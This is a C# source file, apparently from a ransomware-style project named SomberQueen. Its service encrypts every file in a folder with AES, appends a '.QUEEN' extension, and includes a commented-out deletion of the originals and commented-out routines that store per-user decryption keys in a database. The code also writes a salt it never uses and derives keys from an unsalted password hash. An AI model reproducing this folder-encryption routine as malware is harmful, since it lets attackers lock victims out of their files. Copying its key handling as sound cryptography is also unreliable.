using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Security.Cryptography;
using SomberQueen.Utilities;
using Dapper;

namespace SomberQueen.Services
{
    public class EncryptionService
    {
        private readonly DBHelper _dbHelper;

        public EncryptionService(DBHelper dbHelper)
        {
            _dbHelper = dbHelper;
        }



        private static void EncryptFile(string inputFilePath, string outputFilePath, byte[] key)
        {
            byte[] salt = GenerateRandomBytes(16); 
            byte[] iv = GenerateRandomBytes(16);   


                using (var aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;

                    using (var fileStream = new FileStream(outputFilePath, FileMode.Create))
                    {
                        fileStream.Write(salt, 0, salt.Length);
                        fileStream.Write(iv, 0, iv.Length);

                        using (var cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            using (var inputFileStream = new FileStream(inputFilePath, FileMode.Open))
                            {
                                inputFileStream.CopyTo(cryptoStream);
                            }
                        }
                    }
                }
        }

        public static void EncryptFilesInFolder(string folderPath, byte[] key)
        {
            string[] files = Directory.GetFiles(folderPath);


            foreach (string file in files)
            {
                string outputFile = file + ".QUEEN";
                EncryptFile(file, outputFile, key);

                //File.Delete(file);
            }
            /*foreach (string file in files)
            {
                string encryptedFilePath = Path.Combine(
                    Path.GetDirectoryName(file), // Dosyanın bulunduğu klasör
                    Path.GetFileNameWithoutExtension(file) + ".QUEEN" // Dosya adını uzantısız alıp .QUEEN ekle
                );

                EncryptFile(file, encryptedFilePath, password);

                //File.Delete(file);

            }*/


        }


        public static byte[] GenerateEncryptionKey(string password)
        {
            using (var sha256 = SHA256.Create())
            {
                return sha256.ComputeHash(System.Text.Encoding.UTF8.GetBytes(password));
            }
        }

        private static byte[] GenerateRandomBytes(int length)
        {
            byte[] randomBytes = new byte[length];
            using (var rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(randomBytes);
            }
            return randomBytes;
        }

        /*private static string GenerateDecryptionKey()
        {
            byte[] keyBytes = new byte[32];
            using (var rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(keyBytes);
            }
            return Convert.ToBase64String(keyBytes);
        }*/

        /*private static void SaveDecryptionKeyToDatabase(int userId, string decryptionKey, DBHelper dbHelper)
        {
            string query = "UPDATE users SET decryption_key = @decryptionKey WHERE id = @userId";
            dbHelper.Execute(query, new
            {
                decryptionKey = decryptionKey,
                userId = userId
            });
        }
        */

        /*private static int GetUserIDByUsername(string username) {
            string query = "SELECT id FROM users WHERE username = @username";
            return _dbHelper.ExecuteScalar<int>(query, new { username });
        }*/

        public void SaveEncryptedFile(int userId, string fileName, string encryptionKey)
        {
            _dbHelper.ExecuteProcedure("SaveEncryptedFile", new
            {
                p_user_id = userId,
                p_file_name = fileName,
                p_encryption_key = encryptionKey
            });
        }

        public IEnumerable<dynamic> ListEncryptedFiles(int userId)
        {
            string query = "SELECT * FROM encrypted_files WHERE user_id = @userId";

            return _dbHelper.Query<dynamic>(query, new
            {
                userId = userId
            });
        }
    }
}
